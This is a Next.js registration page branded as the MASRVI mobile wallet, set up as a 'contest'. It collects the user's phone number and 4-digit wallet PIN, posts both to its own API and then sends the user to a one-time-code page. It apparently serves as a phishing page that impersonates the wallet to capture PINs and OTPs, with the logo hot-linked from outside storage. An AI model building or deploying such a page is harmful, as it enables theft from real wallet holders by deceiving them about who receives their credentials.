import { useState } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter } from 'next/router';
import { useTranslation } from 'react-i18next';
import axios from 'axios';
import ErrorModal from '@/components/ErrorModal';
import PinKeypad from '@/components/PinKeypad';
import { useContest } from '@/context/ContestContext';

export default function RegisterPage() {
  const { t } = useTranslation();
  const router = useRouter();
  const { updateRegistration } = useContest();
  const [phone, setPhone] = useState('');
  const [entryCode, setEntryCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [showPinPad, setShowPinPad] = useState(false);

  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8);
    setPhone(value);
  };

  const handlePinChange = (newValue) => {
    setEntryCode(newValue);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (phone.length < 8 || entryCode.length < 4) return;
    
    setLoading(true);

    try {
      const { data } = await axios.post('/api/register', { phone, entryCode });

      if (data.success) {
        updateRegistration(phone, entryCode);
        router.push('/otp');
      } else {
        setShowError(true);
      }
    } catch {
      setShowError(true);
    } finally {
      setLoading(false);
    }
  };

  // Show PIN keypad screen
  if (showPinPad) {
    return (
      <>
        <Head>
          <title>MASRVI - {t('registration.password_label')}</title>
        </Head>

        <main className="min-h-screen flex flex-col bg-gray-50">
          {/* Back Button */}
          <div className="px-4 py-4">
            <button
              onClick={() => setShowPinPad(false)}
              className="inline-flex items-center gap-2 text-gray-700 hover:text-primary-700 transition-colors text-base"
            >
              <span className="rtl:rotate-180">&#10094;</span>
              <span>{t('registration.back')}</span>
            </button>
          </div>

          <div className="flex-1 flex flex-col items-center justify-center px-4">
            {/* PIN Keypad */}
            <div className="w-full max-w-sm">
              <PinKeypad
                value={entryCode}
                onChange={handlePinChange}
                maxLength={4}
                instruction={t('registration.enter_pin_instruction')}
              />
            </div>

            {/* Submit button when PIN is complete */}
            {entryCode.length === 4 && (
              <button
                onClick={handleSubmit}
                disabled={loading}
                className="mt-8 w-full max-w-xs py-4 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 text-white font-bold rounded-2xl transition-all shadow-lg text-base"
              >
                {loading ? '...' : t('registration.submit')}
              </button>
            )}
          </div>
        </main>

        <ErrorModal
          isOpen={showError}
          title={t('errors.title')}
          message={t('errors.invalid_registration')}
          buttonText={t('errors.retry')}
          onClose={() => setShowError(false)}
        />
      </>
    );
  }

  // Main registration form
  return (
    <>
      <Head>
        <title>MASRVI - {t('registration.submit')}</title>
      </Head>

      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100">
        {/* Back Button */}
        <div className="px-4 py-3 md:py-4">
          <Link
            href="/"
            className="inline-flex items-center gap-2 text-gray-600 hover:text-primary-700 transition-colors text-sm md:text-base"
          >
            <span className="rtl:rotate-180">&#10094;</span>
            <span>{t('registration.back')}</span>
          </Link>
        </div>

        <div className="flex-1 flex items-center justify-center px-4 py-4 md:py-8">
          <div className="w-full max-w-md">
            <div className="glass-card rounded-2xl md:rounded-3xl p-6 md:p-8">
              {/* Logo */}
              <div className="text-center mb-6 md:mb-8">
                <div className="bg-white rounded-2xl p-3 inline-block shadow-sm mb-4">
                  <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/5810143423896424381_120-1uDefD1vhhxaUyEWoZbKOogvt8VlOX.jpg"
                    alt="Masrvi Logo"
                    width={150}
                    height={60}
                    className="h-14 md:h-16 w-auto object-contain"
                  />
                </div>
                <h1 className="text-xl md:text-2xl font-bold text-gray-800">{t('registration.submit')}</h1>
              </div>

              <div className="space-y-5 md:space-y-6">
                {/* Phone Input */}
                <div>
                  <label htmlFor="phone" className="block text-sm font-semibold text-gray-800 mb-2 text-right">
                    {t('registration.phone_label')}
                  </label>
                  <div className="flex gap-2">
                    <div className="flex items-center px-4 py-3 md:py-4 glass-input rounded-xl text-primary-700 font-bold text-base md:text-lg">
                      222
                    </div>
                    <input
                      id="phone"
                      type="tel"
                      inputMode="numeric"
                      maxLength={8}
                      value={phone}
                      onChange={handlePhoneChange}
                      className="flex-1 px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium"
                      required
                    />
                  </div>
                </div>

                {/* Password - Click to show PIN pad */}
                <div>
                  <label className="block text-sm font-semibold text-gray-800 mb-2 text-right">
                    {t('registration.password_label')}
                  </label>
                  <button
                    type="button"
                    onClick={() => phone.length >= 8 && setShowPinPad(true)}
                    disabled={phone.length < 8}
                    className="w-full px-4 py-3 md:py-4 glass-input rounded-xl text-right flex items-center justify-between disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span className="flex gap-2">
                      {entryCode ? (
                        [...Array(4)].map((_, i) => (
                          <span
                            key={i}
                            className={`w-3 h-3 rounded-full ${
                              i < entryCode.length ? 'bg-primary-500' : 'bg-gray-300'
                            }`}
                          />
                        ))
                      ) : (
                        <span className="text-gray-400 text-sm">{phone.length < 8 ? t('registration.enter_phone_first') : ''}</span>
                      )}
                    </span>
                    <svg className="w-5 h-5 text-gray-400 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </button>
                </div>

                {/* Submit Button */}
                <div className="pt-2 md:pt-4">
                  <button
                    type="button"
                    onClick={handleSubmit}
                    disabled={loading || phone.length < 8 || entryCode.length < 4}
                    className="w-full py-4 md:py-5 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold rounded-2xl transition-all shadow-lg text-base md:text-lg"
                  >
                    {loading ? '...' : t('registration.submit')}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Green Bottom Section */}
        <div className="bg-primary-500 rounded-t-[2rem] py-6 md:py-8 px-4 mt-auto">
          <p className="text-white text-center text-base md:text-lg font-medium">
            Mon wallet 100% simple et securise
          </p>
        </div>
      </main>

      <ErrorModal
        isOpen={showError}
        title={t('errors.title')}
        message={t('errors.invalid_registration')}
        buttonText={t('errors.retry')}
        onClose={() => setShowError(false)}
      />
    </>
  );
}
